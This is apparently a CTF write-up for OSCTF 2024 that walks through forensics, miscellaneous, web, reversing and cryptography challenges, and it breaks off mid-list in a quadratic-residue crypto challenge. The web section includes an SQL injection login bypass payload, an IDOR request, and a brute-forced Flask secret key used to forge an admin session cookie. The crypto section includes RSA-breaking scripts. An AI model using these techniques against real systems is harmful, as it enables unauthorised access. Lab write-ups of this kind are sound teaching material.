Seele Vollerei is an orphaned girl in Cocolia’s Orphanage. But the tragic event in her past made that she was gone forever, until then she returned like a mysterious butterfly. How is this related to the challenge though? You figure out for youself ;)

Author: `@anhshidou`

Given: `SeeleVollerei.docx`

Unzip the `docx` and search using a Text/Code editor. Using `VSCode` .

{{< figure src="13.png" alt="13" >}}

Flag: `OSCTF{V3l10n4_1s_Gr43t}`

### **qRc0dE**

This is a QRCODE, but I can not scan it, whyyyyy????

{{< figure src="14.jpg" alt="14" >}}

Author: @Deit

As you can see, we need to remove the red text and fix the QR to solve the challenge. More interesting than the previous few challenges.

but I’m too lazy to do this. So here’s the website.

[QRazyBox - QR Code Analysis and Recovery Toolkit](https://merri.cx/qrazybox/)

Flag: `OSCTF{r3c0v3R_qR_C0de_1s_s0_fUn}`

## Miscellaneous

### **Sanity Check**

**Description**: 

When shadows grow short, and the sun stands tall, A solstice whispers, the longest of all. In the dance of light, where time seems to bend, Seek the day that marks summer's extend.

Not in the digits of a calendar's fold, But in nature's rhythm, a story is told. On this day of warmth, where daylight beams, The clue lies hidden, within nature's schemes.

Look to the heavens, where planets align, A celestial clue, where mysteries entwine. Amidst the stars, a date to discern, When daylight lingers, and seasons turn.

Unravel this puzzle, with patience and grace, For June's zenith, where time and space embrace. On this solstice's eve, where mysteries gleam, The 21st of June, in sunlight's beam.

P.S: Flag is in discord server only!

Flag format: OSCTF{Text_you_obtain}

**Author**: `@Inv1s1bl3`

[Join the OS-CTF Discord Server!](https://discord.gg/Arydk5XQDZ)

This seemingly simple challenge had only 12 solves cause the Author made is obvious (for him). Since, I joined the server quite early before the comp. I accidently stumbled upon this Flag by accident and saved it. Turns out that wasn’t the way it was meant to be solved LOL.

{{< figure src="15.png" alt="15" >}}

Got First-Blood and a juicy 445 points.

Flag: `OSCTF{So_1t_w4s_4lr3dy_l3aked_1n_g3n3ral_ch4t_h4h4}`

### **Sanity Check - Revenge**

**Description**: 

I WANTED 0 SOLVED ON PREVIOUS SANITY!!

I drank coffee and hit an idea.. this time no one can crack this 😈

P.S: Flag is in discord server only!

Author: `@Inv1s1bl3`

This goes into the history books at the most ridiculously and absurd Discord Challenges to ever exist. Yup, the Author is just a high-schooler. Here’s the Author’s solution for this.

```python
check ⁠🔊ˎˊ˗announcement  and msgs on 21st June. 
there are 2 copy use 3 dot > copy text paste it 
somewhere u will see there is a link and one more riddle
```

{{< figure src="16.png" alt="16" >}}

```python
@everyone WE ARE OFFICIALLY REGISTERED ON CTFtime.org!
https://ctftime.org/event/2416 ~~‎~~|||||||||||||||||||||||||||||||||||||||||
https://drive.google.com/file/d/1_tYb1iJXuVPSeMf8mtEK-XXWeD82o_cC/view?usp=sharing
```

Whatever man !

{{< figure src="17.png" alt="p4" >}}

### **Find the Flagger - Revenge**

**Description**: 

I have hidden another flag on this ctfd site but this time it is much much much harder.

Author: `@5h1kh4r`

Of course, this was a very obvious challenge (only for the authors). Just go to 

[OS CTF](https://ctf.os.ftp.sh/flagger.txt)

{{< figure src="18.png" alt="18" >}}

Flag: `OSCTF{Fl4gg3r_G0t_Fl4gg3d}`

### Finding The Seed

**Description**: I just joined minecraft with my friend and we're trying to see who will be the best in Minecraft. But didn't he know that i have trick under my sleeves that i just need the world seed then i can be better than him. But i can't ask him about the world seed as he will know about my trick. Can you join my server and try to find the seed.

Flag format: OSCTF{world_Seed} ex: OSCTF{10033887773255362}

Author: `@Inv1s1bl3`

<aside>
💡 Here’s is SHL’s write-up for both the Minecraft challenges.

</aside>

This was a very simple challenge where I had to just use the seedcracker mod from https://github.com/19MisterX98/SeedcrackerX.git. 

Here’s a step-by-step guide on how to join a server and use the seedcracker mod

> Caution: This mod can get you banned from most of the public servers so use at your own risk.
> 

`How to Install Fabric and Seedcracker Mod for Minecraft`

`Installing Fabric`

1. **Download the Fabric Installer**:
    - Visit the official Fabric website and download the Fabric installer for your operating system.
2. **Run the Fabric Installer**:
    - Open the Fabric installer you just downloaded.
    - Select the Minecraft version you want to install Fabric for.
    - Click on the "Install" button.
3. **Launch Minecraft with Fabric**:
    - Open your Minecraft launcher.
    - In the bottom-left corner, click on the dropdown menu and select the Fabric profile.
    - Click "Play" to launch Minecraft with Fabric.

`Installing the Seedcracker Mod`

1. **Download the Seedcracker Mod**:
    - Visit the SeedcrackerX GitHub repository at https://github.com/19MisterX98/SeedcrackerX.git.
    - Download the latest release of the Seedcracker mod.
2. **Install the Seedcracker Mod**:
    - Locate your Minecraft mods folder. This is usually found at `~/.minecraft/mods` on Windows or `~/Library/Application Support/minecraft/mods` on macOS.
    - Move the downloaded Seedcracker mod .jar file into the mods folder.
3. **Launch Minecraft with the Mod**:
    - Open your Minecraft launcher.
    - Ensure the Fabric profile is selected.
    - Click "Play" to launch Minecraft with the Seedcracker mod installed.

You are now ready to use the Seedcracker mod in Minecraft. Remember to use it responsibly and be aware of the rules on the servers you join.

`How to Use Seedcracker to Find Out the Seed of a World`

Once you have the Seedcracker mod installed and Minecraft running with Fabric, follow these steps to find out the seed of a world:

1. **Join the Minecraft Server**:
    - Open Minecraft and join the server whose world seed you want to find out.
2. **Activate Seedcracker**:

{{< figure src="19.png" alt="19" >}}

3. **Start Collecting Data**:
    - To start finding the seed, you need to explore the world and let the Seedcracker gather data. This typically involves:
        - Finding and examining structures such as villages, temples, and other world-generated features (check out the repo for more details).
    - Seedcracker will automatically collect the necessary data as you interact with the world.
    - Use
    
    ```bash
    /seedcracker data bits
    ```
    
    {{< figure src="20.png" alt="20" >}}
    
    - To find structure just use
    
    ```bash
    /locate structure #minecraft:structure_name
    ```
    
4. **Check Progress**:
    - Seedcracker will inform you of its progress toward cracking the seed. Keep an eye on the chat or console for updates on how much data has been collected and any other instructions.
    
    {{< figure src="21.png" alt="21" >}}
    
5. **Finalize the Seed**:
    - Once enough data has been collected, Seedcracker will use the information to determine the world seed.
    - The seed will be displayed on your screen or in the chat. Make a note of it.
    
    {{< figure src="22.png" alt="22" >}}
    

And tada✨ the flag is found.

### Code Breaker

**Description**: 

My friend invited me to his public smp Capital Realm where he hid a secret message at /warp CodeBreaker in the Survival World and he challenged me to crack it! Help me to get the secret message!

NOTE: If you find the code use /osctf WXYZ where W,X,Y,Z represent +ve natural number to get the flag!

P.S: You need not buy the game.. You can use other launchers

IP: For Java: Play.CapitalRealm.tech For Bedrock: Play.CapitalRealm.tech Port: 19132

Author: `@Inv1s1bl3` & `@5h1kh4r`

{{< figure src="23.png" alt="23" >}}

In this challenge, fire up TLauncher and open up Minecraft. Go to Multi-Player and join the server.

{{< figure src="24.png" alt="24" >}}

Now, you’ll be met with 6 firelamps and need to find the code behind it. You use mods like `freecam` to go behind the walls and find the code. Just had to see which all switches actually was giving power. After that just enter the code with the command.

```python
/osctf 2456
```

{{< figure src="25.png" alt="25" >}}

Flag: `OSCTF{r3dst0ne_1s_3asy}`

## Web

### **Style Query Listing...?**

pfft.. Listen, I've gained access to this login portal but I'm not able to log in. The admins are surely hiding something from the public, but... I don't understand what. Here take the link and be quiet, don't share it with anyone

Author: `@5h1kh4r`

```
Web instance: https://34.16.207.52:3635/
```

From the source we find out it’s a Basic SQL Injection challenge.

```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SQL Injection Challenge</title>
        <style>
            body {
                font-family: Arial, sans-serif;
```

Using these as the credentials we get the flag.

Username: `admin`

Password: `' OR 1 -- -`

Flag: `OSCTF{D1r3ct0RY_BrU7t1nG_4nD_SQL}`

### **Heads or Tails?**

I was playing cricket yesterday with my friends and my flipped a coin. I lost the toss even though I got the lucky heads.

Author: @5h1kh4r

```bash
Web Instance: https://34.16.207.52:4789
```

Trying out `curl` with `HEAD` request gives us the flag.

```html
└─$ curl -i -X HEAD https://34.16.207.52:4789/get-flag
Warning: Setting custom https method to HEAD with -X/--request may not work the
Warning: way you want. Consider using -I/--head instead.
https/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.8.19
Date: Tue, 16 Jul 2024 03:16:24 GMT
Content-Type: text/html; charset=utf-8
Flag: OSCTF{Und3Rr47Ed_H3aD_M3Th0D}
Content-Length: 0
Connection: close
```

It sent a `HEAD` request to the server, which is designed to retrieve the headers from a response without fetching the body.

Flag: `OSCTF{Und3Rr47Ed_H3aD_M3Th0D}`

### **Indoor WebApp**

The production of this application has been completely indoor so that no corona virus spreads, but that's an old talk right?

Author: `@5h1kh4r`

Web Instance: [https://34.16.207.52:2546](https://34.16.207.52:2546/)

Since, it’s given it’s an `IDOR` challenge.

```bash
└─$ curl https://34.16.207.52:2546/profile?user_id=2

        <h1>Profile</h1>
        <p>Username: Bobo</p>
        <p>Email: bobo@example.com OSCTF{1nd00r_M4dE_n0_5enS3}</p>
```

Flag: `OSCTF{1nd00r_M4dE_n0_5enS3}`

### **Introspection**

Welcome to the Secret Agents Portal. Find the flag hidden in the secrets of the Universe!!!

Author: `@5h1kh4r`

Web Instance: http://34.16.207.52:5134

This challenge had a whopping 572 Solves !

{{< figure src="26.png" alt="p4" >}}

Just Like That !

Flag: `OSCTF{Cr4zY_In5P3c71On}`

### **Action Notes**

I have created this notes taking app so that I don't forget what I've studied

Author: `@5h1kh4r`

Web Instance: http://34.16.207.52:8965

Another interesting challenge. Go ahead and register-login into the site and inspect the page.

We find a cookie that looks awfully like a `Flask Cookie`.

If you don’t know what flask is, **Flask** is a lightweight, web development framework built using python language. Generally, for building websites we use HTML, CSS and JavaScript but in flask the python scripting language is used for developing the web-applications.

To identify the type of cookie, I’d say it pretty much comes to experience but there is also ways to identify them.

Flask uses its own cookie serialization format called "itsdangerous," which encodes and signs data to protect it from tampering.

**How to Identify:**

- Flask cookies often look like long, base64-encoded strings.
- The string typically includes a separator (`.` or `.`) followed by a signature.

I recommend checking out the following resources before getting started.

[flask-unsign](https://pypi.org/project/flask-unsign/)

[Flask HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)

Here’s what I got after logging into the account.

```
eyJ1c2VybmFtZSI6IkFidUNURiJ9.Zpag5w.APgbTMj4gqgOyxpjJ8Y8uc_dRIo
```

Then I found out that none of the wordlists that I had worked, that included `rockyou.txt` and `xato-net-10-million-passwords.txt`.

So, I went searching and found this gem.

https://github.com/Paradoxis/Flask-Unsign-Wordlist

To install the application, simply use pip:

`$ pip install flask-unsign-wordlist`

Now, just type in the following to know the path to the wordlist.

```bash
└─$ flask-unsign-wordlist
/home/abu/.local/lib/python3.11/site-packages/flask_unsign_wordlist/wordlists/all.txt
```

Now, run it against the captured cookie. Boom.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/OSCTF/web]
└─$ flask-unsign --wordlist /home/abu/.local/lib/python3.11/site-packages/flask_unsign_wordlist/wordlists/all.txt --unsign --co
okie 'eyJ1c2VybmFtZSI6IkFidUNURiJ9.ZpakQQ.EqP9t-zEc2x4U0h3UP3rw_GSm54'
[*] Session decodes to: {'username': 'AbuCTF'}
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
[+] Found secret key after 21760 attemptsManuel@secre
'supersecretkey'
```

Now, sign the cookie when decoded only gives the username variable like `{'username': 'AbuCTF'}`.

We sign the cookie with the secret key and set the username to admin.

```bash
└─$ flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'supersecretkey'
eyJ1c2VybmFtZSI6ImFkbWluIn0.ZpapCQ.gstCJD36fb2XKpPDj66X_C1ikRo
```

{{< figure src="27.png" alt="27 " >}}

After inserting the new cookie, we get a bunch of fake flags. Like OSCTF{y0u_tH0ghT_tH1s_W4s_Th3_fL4G}.

Got stuck for a bit. Why not go for a LIL directory bruteforce ? We use the `FFUF` tool for this purpose, which stands for `Fuzz Faster U Fool`.

```bash
└─$ ffuf -w /mnt/c/Documents4/CyberSec/Resources/SecLists/Fuzzing/fuzz-Bo0oM.txt -u http://34.16.207.52:8965/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://34.16.207.52:8965/FUZZ
 :: Wordlist         : FUZZ: /mnt/c/Documents4/CyberSec/Resources/SecLists/Fuzzing/fuzz-Bo0oM.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 241ms]
login                   [Status: 200, Size: 582, Words: 123, Lines: 20, Duration: 239ms]
:: Progress: [4842/4842] :: Job [1/1] :: 85 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```

Now, we find an interesting directory to enumerate. `/admin`.

{{< figure src="28.png" alt="28" >}}

This happened because the cookie is still set with the proper admin credentials. 

Flag: `OSCTF{Av0id_S1mpl3_P4ssw0rDs}`

Quick Break, 

This is the participants during the CTF FR.

{{< figure src="29.png" alt="29" >}}

{{< figure src="30.png" alt="30" >}}

Well, jokes aside. Running a CTF without `CloudFlare` is wild, the server got obliterated by continuous DDOS in the last hour or so.

{{< figure src="31.png" alt="p4" >}}

## Reverse Engineering

### **Gophers Language**

I know go is not a popular language, so I decided of creating a reversing challenge out of it. I'm sure now go will overtake java!!

Author: `@5h1kh4r`

Given: `main.exe`

```bash
└─$ strings main.exe | grep OSCTF
<>GetFileAttributesExWSetCurrentDirectoryWSetHandleInformationGetAcceptExSockaddrs
OSCTF{Why_G0_S0_H4rd}reflect.
```

Flag: `OSCTF{Why_G0_S0_H4rd}`

### **Avengers Assemble**

The Avengers have assembled but for what? To solve this!? Why call Avengers for such a simple thing, when you can solve it yourself

FLAG FORMAT: OSCTF{Inp1_Inp2_Inp3} (Integer values)

Author: `@Inv1s1bl3`

Given: `code.asm`

We’re given an assembly file. Let’s analyze it.

**`Breakdown of the Assembly Logic`**

1. **Input Variables**:
    - **Inp1** and **Inp2** are read from user input and are stored in memory locations.
    - **Inp3** is also read and stored similarly.
2. **Conditions**:
    - **Condition 1**: The sum of Inp1 and Inp2 must equal `0xdeadbeef`.
    - **Condition 2**: Inp1 must be less than or equal to `0x6f56df65`.
    - **Condition 3**: Inp2 must be equal to `0x6f56df8d`.
    - **Condition 4**: Inp3 XOR Inp2 must equal `2103609845`.

**Analyzing Conditions**

1. **From Condition 3**, we know:
    - Inp2 = `0x6f56df8d`.
2. **From Condition 1**, we can find Inp1:
    - Inp1 + Inp2 = `0xdeadbeef`
    - Inp1 = `0xdeadbeef - Inp2`.
3. **Condition 2** states that Inp1 must be ≤ `0x6f56df65`, which is satisfied since `0x6f56df62 < 0x6f56df65`.
4. **From Condition 4**:
    - We need to find Inp3:
    - Inp3 `XOR` Inp2 = `2103609845`
    - Inp3 = `2103609845 XOR 0x6f56df8d`.

A simple maneuver in python, gives us the required numbers.

```bash
└─$ python3
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> input2 = "0x6f56df8d"
>>> dec = int(input2, 16)
>>> print(dec)
1867964301
>>> deadbeef = "0xdeadbeef"
>>> dec = int(deadbeef, 16)
>>> print(dec)
3735928559
>>> deadbeef = 3735928559
>>> input2 = 1867964301
>>> input1 = deadbeef - input2
>>> print(input1)
1867964258
>>> input3 = input2 ^ 2103609845
>>> print(input3)
305419896
```

Flag: `OSCTF{1867964258_1867964301_305419896}`

### Another Python Game

You know, I love Pygame why don't you. Prove your love for Pygame by solving this challenge Note: It is necessary to keep the background.png file in the same place as the exe file so that the exe file runs properly

Author: `@5h1kh4r`

Given: `background.png & source.exe`

Now, here comes a new interesting challenge. We are given a source.exe, that runs a `PyGame` when executed. Now, since we can guess this is compiled using Python. We use a tool to extract compiled byte code or `.pyc` file.

https://github.com/extremecoders-re/pyinstxtractor

```bash
└─$ python3 pyinstxtractor.py source.exe
[+] Processing source.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.8
[+] Length of package: 35787549 bytes
[+] Found 148 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: source.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.8 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: source.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

Now, the extracted info will be stored in a new directory with lot of stuff, just mv the `.pyc` file that starts with the same name as the executable.

`$ mv source.exe_extracted/source.pyc .`

Now, in this case, just cat the file, you’ll get the flag. But let’s go one step further and try to decompile it back to a readable python file.

We can do this by using the built-in python,

`uncompyle6` library to decompile it back to readable Python code.

You can install it using pip:

```bash
pip install uncompyle6
```

```bash
└─$ uncompyle6 source.pyc > source.py

┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/OSCTF/rev]
└─$ cat source.py
# uncompyle6 version 3.9.1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0]
# Embedded file name: source.py
import pygame, sys
pygame.init()
screen_width = 800
screen_height = 600
screen = pygame.display.set_mode((screen_width, screen_height))
pygame.display.set_caption("CTF Challenge")
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
```

Beautiful. The flag is right there.

Flag: `OSCTF{1_5W3ar_I_D1dn'7_BruT3f0rc3}`

## Cryptography

### **Cipher Conundrum**

OmniTech has encrypted a crucial piece of data using multiple layers of security. Your mission is to decrypt the flag and uncover the hidden message. Decrypt the flag and submit your answer. Good luck!

Author: `@5h1kh4r`

Given: `encrypted.txt`

We’ve been given a base64 string, decoding it you get a hex string, which almost looks like the flag.

```bash
└─$ echo "NDc0YjM0NGMzNzdiNTg2NzVmNDU1NjY2NTE1ZjM0NTQ2ODM5NzY0YTZiNmI2YjZiNmI3ZA==" | base64 -d
474b344c377b58675f455666515f34546839764a6b6b6b6b6b7d
└─$ python3
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> input = '474b344c377b58675f455666515f34546839764a6b6b6b6b6b7d'
>>> flag = bytes.fromhex(input).decode('ascii')
>>> print(flag)
GK4L7{Xg_EVfQ_4Th9vJkkkkk}
```

So `Caesar`cipher is involved but you don’t get the proper flag straight away.

{{< figure src="32.png" alt="32" >}}

So now, we know that it’s shifting 8 rounds, changing the shifts to 8, will still not get you all the way there. Just go down the buttons, and reaching the custom alphabet one. You get the em.

{{< figure src="33.png" alt="33" >}}

Flag: `OSCTF{5o_M3nY_C1ph3Rsssss}`

### **The Secret Message**

Bob was sending an encrypted message to Alice using a method known only to a few. But Bob seems to have messed something up in the code. Can you identify that mistake and leverage it to gain access to their conversations?

Author: `@5h1kh4r`

Given: `chall.py` & `encrypted.txt`

```bash
from Cryptodome.Util.number import getPrime, bytes_to_long

flag = bytes_to_long(b"REDACTED")
p = getPrime(512)
q = getPrime(512)
n = p*q
e = 3

ciphertext = pow(flag, e, n)

print("n: ", n)
print("e: ", e)
print("ciphertext: ", ciphertext)
```

We’ve been given a traditional RSA problem but with the public exponent set to 3. 

When the public exponent `e` is too small (like 3), it can lead to vulnerabilities, particularly when the plaintext message is small or not padded correctly. In such cases, the ciphertext can be smaller than the modulus `n`, and it becomes feasible to recover the plaintext directly by taking the cube root of the ciphertext.

Here’s a script that exploits this vulnerability in the RSA encryption.

```bash
from Crypto.Util.number import long_to_bytes
import gmpy2

n = 95529209895456302225704906479347847909957423713146975001566374739455122191404873517846348720717334832208112563199994182911677708320666162110219260456995238587348694937990770918797369279309985690765014929994818701603418084246649965352663500490541743609682236183632053755116058982739236349050530235419666436143
e = 3
c = 123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125

m = gmpy2.iroot(c, e)[0]
flag = long_to_bytes(m)

print(flag)
```

And, we get the flag.

```bash
└─$ python3 solve.py
b'OSCTF{Cub3_R00Ting_RSA!!}'
```

This can also be solved by using tools like `RsaCtfTool` or `dCode`.

```bash
└─$ python3 RsaCtfTool.py -n 95529209895456302225704906479347847909957423713146975001566374739455122191404873517846348720717334832208112563199994182911677708320666162110219260456995238587348694937990770918797369279309985690765014929994818701603418084246649965352663500490541743609682236183632053755116058982739236349050530235419666436143 -e 3 --decrypt 123455882152544968263105106204728561055927061837559618140477097078038573915018542652304779417958037315601542697001430243903815208295768006065618427997903855304186888710867473025125

Results for /tmp/tmpy22d3pw1:

Decrypted data :
HEX : 0x4f534354467b437562335f52303054696e675f52534121217d
INT (big endian) : 497932640030035090673714227540328105219618218595824116507005
INT (little endian) : 785450059782127466601284682994930458292841167568381589803855
utf-8 : OSCTF{Cub3_R00Ting_RSA!!}
STR : b'OSCTF{Cub3_R00Ting_RSA!!}'
```

Flag: `OSCTF{Cub3_R00Ting_RSA!!}`

{{< figure src="34.png" alt="34" >}}

### **Efficient RSA**

I have heard that the smaller, the more efficient (pun intended). But how well does that apply to Cryptography?

Author: `@5h1kh4r`

Given: `chall.py` & `encrypted.txt`

This is another simple RSA problem, that can just be solved with `RsaCtfTool` . This is simple because the primes, `p` and `q` are quite small (112 bits), which can be easily factorized and decrypted.

```bash
└─$ python3 RsaCtfTool.py -n 13118792276839518668140934709605545144220967849048660605948916761813 -e 65537 --decrypt 8124539402402728939748410245171419973083725701687225219471449051618
private argument is not set, the private key will not be displayed, even if recovered.
['/tmp/tmp11vuh3k7']

[*] Testing key /tmp/tmp11vuh3k7.
attack initialized...
attack initialized...
[*] Performing factordb attack on /tmp/tmp11vuh3k7.
[*] Attack success with factordb method !

Results for /tmp/tmp11vuh3k7:

Decrypted data :
HEX : 0x0000004f534354467b463463743072314e675f4630725f4c3166337d
INT (big endian) : 497932640030035151914077676365601747605810588546200720782205
INT (little endian) : 13185180858806649658217123473362598238610573956617618391881629040640
utf-8 : OSCTF{F4ct0r1Ng_F0r_L1f3}
utf-16 : 伀䍓䙔䙻挴ぴㅲ李䙟爰䱟昱紳
STR : b'\x00\x00\x00OSCTF{F4ct0r1Ng_F0r_L1f3}'
```

Flag: `OSCTF{F4ct0r1Ng_F0r_L1f3}`

### **Couple Primes**

I have used RSA but I think I have made it faster by generating the primes in some different fashion. I bet you can't decrypt my Super Secure Message! Haha!

Author: `@Vanmaxohp`

Given: `cipher` & `source.py`

Now, this is a bit different from the other RSA problems from the generation of their primes.

```python
from Crypto.Util.number import *
from sympy import nextprime

flag = b'REDACTED'

p = getPrime(1024)
q = nextprime(p)
e = 65537

n = p * q
c = pow(bytes_to_long(flag), e, n)

print(f"n = {n}")
print(f"c = {c}")
```
<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

The logic behind this is because both the primes are close to each other, we can go ahead and use the `Fermat’s Factorization` method. 

Fermat's factorization method is based on the idea that any odd integer n can be expressed as the difference of two squares:

$$
n=a^2−b^2
$$

This can be rewritten as:

$$
n=(a+b)(a−b)
$$

If `n = p × q`, where p and q are the prime factors of n, and p and q are close to each other, then a and b can be found efficiently.

`Steps of Fermat's Factorization`

**Initialize a**:
Start with a as the ceiling of the square root of n:

$$
a=⌈\sqrt{n}⌉
$$

**Compute** b^2 :

$$
b^2=a^2−n.
$$

**Check if** b^2  **is a perfect square**:
If b^2 is a perfect square, then b = sqrt(b^2) is an integer, and we have: n = (a + b)(a - b)
So, the factors are p = a - b and q = a + b

**Adjust a**:
If b^2 is not a perfect square, increment a by 1 and repeat the process until  becomes b^2 a perfect square.

Here’s the implementation of Fermat’s factorization method to decrypt the ciphertext.

```python
from Crypto.Util.number import long_to_bytes
import math

n = 20159884168863899177128175715030429666461733285660170664255048579116265087763268748333820860913271674586980839088092697230336179818435879126554509868570255414201418619851045615744211750178240471758695923469393333600480843090831767416937814471973060610730578620506577745372347777922355677932755542699210313287595362584505135967456855068550375989801913361017083952090117041405458626488736811460716474071561590513778196334141517893224697977911862004615690183334216587398645213023148750443295007000911541566340284156527080509545145423451091853688188705902833261507474200445477515893168405730493924172626222872760780966427
e = 65537
c = 18440162368010249375653348677429595229051180035668845001125855048750591059785630865891877031796050869136099359028540172514890273415892550857190509410541828375948243175466417949548148007390803680005616875833010137407850955608659023797782656930905693262770473679394796595557898347900786445803645539553815614140428316398058138450937721961593146082399553119578102712100359284788650328835784603011091312735813903241087475279011862693938914825685547337081335030237385061397899718079346063519325222861490101383929790275635381333028091769118083102339908694751574572782030287570280071809896532329742115422479473386147281509394

def fermat(n):
    a = math.isqrt(n)
    b2 = a * a - n
    while b2 < 0 or not math.isqrt(b2) ** 2 == b2:
        a += 1
        b2 = a * a - n
    b = math.isqrt(b2)
    p = a - b
    q = a + b
    return p, q

p, q = fermat(n)

phi = (p - 1) * (q -1)
d = pow(e, -1, phi)
plaintext = pow(c, d, n)
flag = long_to_bytes(plaintext)

print(flag)
```

And that gives us the flag.

```python
└─$ python3 solve.py
b'OSCTF{m4y_7h3_pR1m3_10v3_34cH_07h3r?}'
```

Even this can be solved with the `RsaCtfTool`.

```python
utf-8 : OSCTF{m4y_7h3_pR1m3_10v3_34cH_07h3r?}
utf-16 : 伀䍓䙔浻礴㝟㍨灟ㅒ㍭ㅟ瘰弳㐳䡣た样爳紿
```

Flag: `OSCTF{m4y_7h3_pR1m3_10v3_34cH_07h3r?}`

Now, you guys have to look up Fermat LOL. Truly Badass.

{{< figure src="35.png" alt="p4" >}}

{{< figure src="36.png" alt="p4" >}}

{{< figure src="37.png" alt="p4" >}}

{{< figure src="38.png" alt="p4" >}}

### **QR**

In the realm of Enigmatica, the renowned cryptographer Adrien has left behind an encrypted message and a peculiar set of clues. He also provides you with the encryption code, knowing that you won't ever be able to crack it. Can you Prove him WRONG?

Author:`@Vanmaxohp`

Given: `cipher` & `source.py`

```python
from Crypto.Util.number import *
from random import *

flag = b'REDACTED'

p = 96517490730367252566551196176049957092195411726055764912412605750547823858339
a = 1337

flag = bin(bytes_to_long(flag))[2:]
encrypt = []

for bit in flag:
    encrypt.append(pow(a, (randint(2, p) * randrange(2, p, 2)) + int(bit), p))

print(encrypt)
```

Here’s what the program does in mathematical notations.

$$
a^{rand(2,p)^2+int(0,1)}mod p
$$

And this is how you reverse the encryption.

$$
i^{(p-1)//2}mod p
$$

I mean I left a lot of details, because I’m yet to understand the full concept of `Quadratic Residues`.

[How do you determine whether or not any given integer is a quadratic residue modulo m?](https://www.quora.com/How-do-you-determine-whether-or-not-any-given-integer-is-a-quadratic-residue-modulo-m)

Credits to `Singapore Students Merger` team for this code. 

```python
from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long

encrypt = [22669242357499213108739139123540498576712276675707825520226104937626916961164, 37739668184440283669142551967709956128855334825882997559266083688111182240250, 25441665154628681485284503278748795972155196569837035753551875903751126142907, 35474505298556513912261603284362124842534115048111240988499653344464862347910, 71151726893269930043162595577071144115819190380361907433725654317094008784114, 73908762436740808052248681916206887963850159072530911859252452338379974236177, 57101936693938413660193888525274029620321481186566605918839145923743543515485, 50142333201706360628926860142168383004375393280107340032844355956106602452523, 66674223908870374966793234843060598734149612681545963187829047004109492467665, 75645951336401957433211616046598596196060464792740476510614442261473108101899, 94528733593743148889841689957696362251114835391113504434828558197260207590866, 338929841930217321055430137125845807027667700750167006527471975419285881175, 75088745144792582813916110577214942601913690860975091089436299911890274849516, 74394014010432727069604983822453343060373458821166358799217874034131664206428, 91221454312560232354241720239905868418614720160185328828194353719168557045934,
89436045494785057136882190534245736811593108055016502277283940183490502024882, 36631994189142987353938811699895106669313412655518192297575560793247704071860, 49403836768060341935370936426818980205828912886168944869209309717919544869947, 5616873069301481432517730919085312761422493127537663227459245162137215060735, 75692295200755294854688807216380730178664527141203391464535121521209043834993, 15194708204076967436620162748020990752047142968672860194686090885307864541474, 27277222211574032304771363985383912197197327554327469597153300479846356132808, 45261613524045806253381673048386226694937942616980606201869397738899866905378, 26498263144816281499090104271140576634942820174774993262349660857222993248471, 87216049531517871472233771214866020579318469232551002046372594293084924479565, 61079631140009807983697771559698911811124899161770558765256300027873402624773, 40187385460801786365229051630671758050898348280702951477774368430993662284223, 19435004756275149573206597582697564506077159657516804306707743145398145728190, 60534803688140235437766737595053893019813287990331834061734276631971889937279, 17573561855930392335155769049734222227716957010154641579911147686774188998566,
41403316081054585754934637071855801014515749681128353900785407130105322243984, 40362328775237311903945159656511902356255783631337123381232819980986120456505, 57384464268475230386821062576143029524498446034687355025688002978188223711228, 74708560803113835980340910678062550296115799591572427722008511140168307336323, 74935272654162080601713865548118116906970893658126663792668800521042780150102, 30676375144360278365095181463678017210742380110381246442386971233358605801174, 51218809129488243088667250185728056488185967028209708831208561153043218896914, 52667228342599779803395395514675913186746539512597988672827688776368848026404, 40594056301032510988069804296372301083061251058162211839008693187246371187689, 37290991127881086823246556743553921965773790053301868408488315804483282116318, 5746745299518583409738624442060864880649976464429203847655956078291015323024, 83142796591762846779423574172404777751215334009592343937308070283358587157918, 1706097043709823185789843875896794690811119846511423394258191917855932285445, 13959599257811926066796633697525167722734651987360297280847164040236153673966, 33518788862070124533164301115377784528680041802197136462152725129830513482288, 67884134834968989556778104209935732570770732953490080241251674446055336732267, 